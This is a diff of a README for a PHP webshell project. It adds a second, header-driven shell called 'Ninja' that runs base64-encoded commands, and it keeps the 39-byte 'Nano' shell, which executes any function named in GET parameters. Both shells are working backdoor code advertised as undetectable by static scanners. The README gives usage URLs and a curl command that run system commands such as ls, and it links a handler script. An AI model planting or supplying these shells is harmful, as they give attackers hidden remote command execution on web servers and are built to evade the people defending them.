@@ -1,8 +1,17 @@
 # nano
-nano is a PHP webshell which is code golfed to be extremely stealthy.\
-Put it on watch maybe, I am planning to upload some variantions of it really soon.
+Nano is a family of PHP webshell code golfed to be extremely stealthy and efficient.\
+Put it on watch maybe, I will continue to upload more webshells in here.
 
-### Usage
+### Nano
+```php
+<?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
+```
+#### Features
+- 39 bytes in size
+- Can't be detected by static code scanners
+- Supports authentication
+
+#### Usage
 `http://example.com/nano.php?f=function&c=command&p=password`
 
 `f` is for function\
@@ -13,31 +22,23 @@ For example, the code below will execute the `ls` command:
 
 `http://example.com/nano.php?f=system&c=ls&p=password`
 
-### Features
-- 39 bytes in size ([nodistribute.com](http://nodistribute.com/) said its an empty file lmao)
-- Fully undetectable by security solutions that scan static code
-- Supports password protection
-- Fully flexible & efficient if you know stuff
-
-## Functioning
+### Ninja
 ```php
-<?$x=$_GET;($x[p]=='_'?$x[f]($x[c]):y);
+<?preg_match('/(.*)\((.*)\)/',base64_decode(substr(getallheaders()['x'],1)),$c);@$c[1]($c[2]);
 ```
-Yep, that's the source code and I know that looks kind of puzzling but let me explain it.
+#### Features
+- 93 bytes in size
+- Fully Undetectable
 
-- `<?` a valid replacement for `<?php`
+#### Usage
+This one a bit complex.\
+Lets say you want to run `system(ls)` so you will need to base64 encode it i.e. `c3lzdGVtKGxzKQ==`
+Now add any **1** character at the start of it. Let say 'x' so it will be `xc3lzdGVtKGxzKQ==`
+Now open your terminal and type the following command
+`curl -H 'x: xc3lzdGVtKGxzKQ==' http://example.com/backdoored.php`
+Too much work? You can use the [handler](https://github.com/UltimateHackers/nano/blob/master/handler.py) instead.
 
-- `$x=$_GET;` defines a variable `x` which holds the value `$_GET` so we can use just `$x` instead of `$_GET` to save space.
-
-- `(condition ? code : code )` is a shorthand for `if (condition){code}else{code}`. You can read more about it [here](https://davidwalsh.name/php-shorthand-if-else-ternary-operators).
-
-- `$x[p]=='_'` this is the condition which is mentioned in the previous part. It checks if the value of parameter p is equal to `'_'`. Yep, `_` is the password.
-
-- If the password matches, the code `$x[f]($x[c])` is executed. As you guys know, PHP's syntax for executing functions is `function(argument)`, I kept both `function` and `arugment` variables so you can specify them through a GET request.
-
-- The `y` does nothing here, I just had to add it to maintain the syntax.
-
-- Why didn't I end it with a `?>`? Because we don't need to.
+![handler](https://i.imgur.com/hkAHGwH.png)
 
 #### Everything Else
 This is my first php thingy so if there's way to do what I did in a better way please let me know or open a pull request.\
